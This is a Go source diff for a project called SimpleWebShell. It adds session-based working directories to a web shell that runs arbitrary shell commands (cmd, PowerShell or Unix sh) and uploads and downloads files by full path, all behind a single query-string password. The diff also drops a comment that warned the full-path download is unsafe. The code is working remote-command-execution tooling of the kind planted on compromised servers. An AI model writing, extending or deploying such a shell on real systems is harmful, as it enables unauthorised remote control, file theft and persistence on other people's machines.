@@ -2,6 +2,7 @@ package route
 
 import (
 	"SimpleWebShell/pages"
+	"SimpleWebShell/session"
 	"fmt"
 	"io"
 	"net/http"
@@ -31,17 +32,75 @@ func handleRoot(c *gin.Context) {
 	c.String(http.StatusOK, pages.GetWebShellHTML())
 }
 
-// 返回当前工作目录（带 key 验证）
+// session 创建
+func handleSessionCreate(c *gin.Context) {
+	key := c.Query("key")
+	if key != password {
+		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+	id := session.New()
+	c.String(http.StatusOK, id)
+}
+
+// session 列表
+func handleSessionList(c *gin.Context) {
+	key := c.Query("key")
+	if key != password {
+		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+	list := session.List()
+	var b strings.Builder
+	for id, info := range list {
+		_, _ = fmt.Fprintf(&b, "%s\t%s\n", id, info.Dir)
+	}
+	c.Header("Content-Type", "text/plain; charset=utf-8")
+	c.String(http.StatusOK, b.String())
+}
+
+// session 删除
+func handleSessionDelete(c *gin.Context) {
+	key := c.Query("key")
+	if key != password {
+		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+	sessID := c.Query("session")
+	if sessID == "" {
+		c.String(http.StatusBadRequest, "session 不存在")
+		return
+	}
+	if !session.Delete(sessID) {
+		c.String(http.StatusBadRequest, "session 不存在")
+		return
+	}
+	c.String(http.StatusOK, "session 已删除")
+}
+
+// 返回当前工作目录（带 key + session 验证）
 func handleGetCurrentPath(c *gin.Context) {
 	key := c.Query("key")
 	if key != password {
 		c.String(http.StatusUnauthorized, "Unauthorized")
 		return
 	}
+	sessID := c.Query("session")
+	if sessID != "" && !session.Exists(sessID) {
+		c.String(http.StatusBadRequest, "session 不存在")
+		return
+	}
 
-	dir, err := os.Getwd()
-	if err != nil {
-		c.String(http.StatusInternalServerError, fmt.Sprintf("获取当前目录失败: %v", err))
+	if sessID == "" {
+		dir, _ := os.Getwd()
+		c.Header("Content-Type", "text/plain; charset=utf-8")
+		c.String(http.StatusOK, dir)
+		return
+	}
+
+	dir, ok := session.GetDir(sessID)
+	if !ok {
+		c.String(http.StatusBadRequest, "session 不存在")
 		return
 	}
 
@@ -55,6 +114,12 @@ func handleGet(c *gin.Context) {
 	key := c.Query("key")
 	if key != password {
 		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+
+	sessID := c.Query("session")
+	if sessID != "" && !session.Exists(sessID) {
+		c.String(http.StatusBadRequest, "session 不存在")
 		return
 	}
 
@@ -73,9 +138,9 @@ func handleGet(c *gin.Context) {
 	}
 
 	// 执行命令
-	result, err := executeCommand(cmd)
+	result, err := executeCommandWithSession(sessID, cmd)
 	if err != nil {
-		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
+		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v\n%s", err, result))
 		return
 	}
 
@@ -88,13 +153,14 @@ func handlePost(c *gin.Context) {
 	// 检查Content-Type
 	contentType := c.GetHeader("Content-Type")
 
-	var key, cmd string
+	var key, cmd, sessID string
 
 	if strings.Contains(contentType, "application/json") {
 		// 处理JSON格式
 		var jsonData struct {
-			Key string `json:"key"`
-			Cmd string `json:"cmd"`
+			Key     string `json:"key"`
+			Cmd     string `json:"cmd"`
+			Session string `json:"session"`
 		}
 
 		if err := c.ShouldBindJSON(&jsonData); err != nil {
@@ -104,15 +170,22 @@ func handlePost(c *gin.Context) {
 
 		key = jsonData.Key
 		cmd = jsonData.Cmd
+		sessID = jsonData.Session
 	} else {
 		// 处理表单格式（向后兼容）
 		key = c.PostForm("key")
 		cmd = c.PostForm("cmd")
+		sessID = c.PostForm("session")
 	}
 
 	// 验证密钥
 	if key != password {
 		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+
+	if sessID != "" && !session.Exists(sessID) {
+		c.String(http.StatusBadRequest, "session 不存在")
 		return
 	}
 
@@ -123,14 +196,84 @@ func handlePost(c *gin.Context) {
 	}
 
 	// 执行命令
-	result, err := executeCommand(cmd)
+	result, err := executeCommandWithSession(sessID, cmd)
 	if err != nil {
-		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
+		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v\n%s", err, result))
 		return
 	}
 
 	c.Header("Content-Type", "text/plain; charset=utf-8")
 	c.String(http.StatusOK, result)
+}
+
+// 执行命令，支持 session 内的当前工作目录并处理 cd
+func executeCommandWithSession(sessID, cmdStr string) (string, error) {
+	cmdStr = strings.TrimSpace(cmdStr)
+	if cmdStr == "" {
+		return "", nil
+	}
+
+	// 如果没带 session，使用进程当前目录执行（兼容老行为）
+	if sessID == "" {
+		return runShellInDir(cmdStr, "")
+	}
+
+	// 检查 session 是否存在
+	curDir, ok := session.GetDir(sessID)
+	if !ok {
+		return "session 不存在", fmt.Errorf("session 不存在")
+	}
+
+	trim := strings.TrimSpace(cmdStr)
+	if strings.HasPrefix(trim, "cd") {
+		parts := strings.SplitN(cmdStr, "&&", 2)
+		first := strings.TrimSpace(parts[0])
+		target := strings.TrimSpace(strings.TrimPrefix(first, "cd"))
+		if target == "" {
+			target = os.Getenv("HOME")
+		}
+		if strings.HasPrefix(target, "~") {
+			target = filepath.Join(os.Getenv("HOME"), strings.TrimPrefix(target, "~"))
+		}
+		var newdir string
+		if filepath.IsAbs(target) {
+			newdir = filepath.Clean(target)
+		} else {
+			newdir = filepath.Clean(filepath.Join(curDir, target))
+		}
+		if fi, err := os.Stat(newdir); err == nil && fi.IsDir() {
+			session.SetDir(sessID, newdir)
+		} else {
+			return fmt.Sprintf("cd: %s: no such directory", target), nil
+		}
+
+		if len(parts) == 2 {
+			rest := strings.TrimSpace(parts[1])
+			return runShellInDir(rest, session.MustGetDir(sessID))
+		}
+		return fmt.Sprintf("changed directory to %s", session.MustGetDir(sessID)), nil
+	}
+
+	return runShellInDir(cmdStr, curDir)
+}
+
+func runShellInDir(cmdStr, dir string) (string, error) {
+	var cmd *exec.Cmd
+
+	// 根据shell类型使用不同的参数
+	shellLower := strings.ToLower(shellPath)
+	if strings.Contains(shellLower, "cmd") || strings.Contains(shellLower, "cmd.exe") {
+		cmd = exec.Command(shellPath, "/c", cmdStr)
+	} else if strings.Contains(shellLower, "powershell") || strings.Contains(shellLower, "pwsh") {
+		cmd = exec.Command(shellPath, "-Command", cmdStr)
+	} else { // 默认假设为类Unix shell
+		cmd = exec.Command(shellPath, "-c", cmdStr)
+	}
+
+	cmd.Dir = dir
+
+	output, err := cmd.CombinedOutput()
+	return string(output), err
 }
 
 // 处理文件上传
@@ -216,7 +359,7 @@ func handleFileSend(c *gin.Context) {
 
 		outFile, ferr := os.Create(outPath)
 		if ferr != nil {
-			part.Close()
+			_ = part.Close()
 			for _, f := range savedFiles {
 				_ = os.Remove(f)
 			}
@@ -286,7 +429,6 @@ func handleFileReceive(c *gin.Context) {
 		return
 	}
 
-	// 不再限制为 basename，支持传入全路径（请注意安全）
 	// 打开文件
 	f, err := os.Open(filePath)
 	if err != nil {
@@ -340,28 +482,4 @@ func handleFileReceive(c *gin.Context) {
 
 	// 下载完成，简单记录时间（或返回日志）
 	_ = time.Now()
-}
-
-// 执行shell命令
-func executeCommand(cmdStr string) (string, error) {
-	var cmd *exec.Cmd
-
-	// 根据shell类型使用不同的参数
-	shellLower := strings.ToLower(shellPath)
-	if strings.Contains(shellLower, "cmd") || strings.Contains(shellLower, "cmd.exe") {
-		// Windows CMD 使用 /c 参数
-		cmd = exec.Command(shellPath, "/c", cmdStr)
-	} else if strings.Contains(shellLower, "powershell") || strings.Contains(shellLower, "pwsh") {
-		// PowerShell 使用 -Command 参数
-		cmd = exec.Command(shellPath, "-Command", cmdStr)
-	} else { // 默认假设为类Unix shell
-		// Linux/Unix shells (bash, sh, zsh等) 使用 -c 参数
-		cmd = exec.Command(shellPath, "-c", cmdStr)
-	}
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(output), err
-	}
-	return string(output), nil
 }
